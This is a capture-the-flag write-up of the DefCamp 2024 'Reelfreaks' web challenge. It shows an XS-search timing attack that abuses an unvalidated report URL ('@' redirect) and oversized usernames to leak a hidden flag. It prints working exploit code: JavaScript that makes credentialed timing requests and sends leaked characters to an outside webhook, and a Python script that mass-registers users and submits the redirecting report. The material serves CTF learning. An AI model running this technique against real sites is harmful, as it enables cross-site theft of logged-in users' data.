---
title: "Reelfreaks D-CTF 2024"
date: 2024-09-30 14:09:30 +0300
categories: [ Web exploitation, CTF Writeup]
tags: [XS-Search,Web]
media_subpath: /assets/img/
---
# Reelfreaks

## Analysis 
Reelfreaks is a web challenge for Defcamp CTF 2024
The Challenge includes source for website that has different movie titles and rad dancing gifs, with a report functionality
![Pasted image 20240928111811](Pasted image 20240928111811.png)
Checking the database we can see that the movie with id 30 has the flag as it's name, but it's banned so most functionality is disabled for it and only the admin can see it in it's watchlist
![Pasted image 20240928111941](Pasted image 20240928111941.png)
but any user can add it to their watchlist just by sending a request with it's id to the add_movie endpoint 
![Pasted image 20240928113023](Pasted image 20240928113023.png)
This doesn't help us yet because we can't look at it in any way from users with a "regular_freak" role.

The report functionality is interesting because the app doesn't check if the host of the url is the one it's expecting:
![Pasted image 20240928113344](Pasted image 20240928113344.png)
Therefore we can use something like an @ symbol and our on domain to redirect the request to an outside domain.

Because of the lack of any XSS we could find we had to find some other way to extract the flag which is the name of our banned movie.

Looking at the source for the /watchlist endpoint we can see that the search shows movies like what you send
![Pasted image 20240928114436](Pasted image 20240928114436.png)
this screams XS-search, but how? [Explanation]( https://xsleaks.dev/docs/attacks/xs-search/)

Looking at the database models we see that users can have really long usernames
![Pasted image 20240928114550](Pasted image 20240928114550.png)
So we can make usernames that are really long and add the banned movie to their watchlist and that should slow the search down when the admin searches for it in the watchlist area, when searching for a movie which doesn't exist there should be no slowdown, therefore our exploit would look like:

1. Register users with really long usernames log them in and add the flag movie to their watchlist 
2. Make a report to the admin that redirects it to your own domain
3. Make the admin do requests from your site to the watchlist and bruteforce the flag by measuring how long it takes the page to load depending what you search adding another character every time you get a hit (page that takes really long to load)
4. ???
5. profit

## Exploit
My teammate wrote the exploit and got it to work, I later made some changes to make it 100% reliable
first we make a webhook to host the XS-search script call it webhook 1
```html
<html>
<head>
  <title>Title of the document</title>
  <script>
    //var printable = "0123456789abcdefghijklmnopqrstuvwxyz!\"#$\'()*+,-./:;<=>?@[\\]^_`{|}~";
    var printable = "0123456789abcdefghijklmnopqrstuvwxyz-}_";
    var xmlHttp = new XMLHttpRequest();
    var progress = "DCTF{";
    while(true){
      for (let i = 0; i < printable.length; i++) {
        var startTime = performance.now();
        try{
          xmlHttp.open("GET", "https://127.0.0.1:5000/watchlist?q="+progress+printable[i], false ); // false for synchronous request
          xmlHttp.withCredentials = true;
          xmlHttp.send( null );
        }catch(error){
        }
        var endTime = performance.now();
        if ((endTime-startTime) > 200){
          progress += printable[i];
          try{
          xmlHttp.open("GET", "WEBHOOK2?t="+progress, false ); // false for synchronous request
          xmlHttp.send( null );
          }catch(error){
          }
          break;
        }
      };
    }
  </script>
</head>

<body>
</body>

</html>
```
Webhook2 is where we get sent the result

Then we run the python script to create the users and send the initial report which redirects to webhook 1
```python
import requests

url = "https://ChallengeUrl"

webhook = "Webhook1" # No http/s 

  

register_url = f"{url}/register"

login_url = f"{url}/login"

add_movie_url = f"{url}/add_movie"

report_url = f"{url}/report"

  
  
  

for i in ["a", "b", "c", "d", "e","f", "g", "h", "q","w"]:

    with requests.Session() as s:

        s.post(register_url, data= {'username': i*5000000, 'password': '1234'}, verify = False)

        s.post(login_url, data={'username': i*5000000, 'password': '1234'}, verify = False)

        s.post(add_movie_url, data={'movie_id':30}, verify=False)

  

s = requests.Session()

s.post(register_url, data= {'username': "1234", 'password': '1234'}, verify = False)

s.post(login_url, data={'username': '1234', 'password': '1234'}, verify = False)

x = s.post(report_url, data = {'movie': f"@{webhook}"}, verify = False)

print(x.text)
```

![Pasted image 20240929150126](Pasted image 20240929150126.png)
And we get the flag: `DCTF{l3ak_ev3ry_d4y_0f_ev3ry_w33k}`
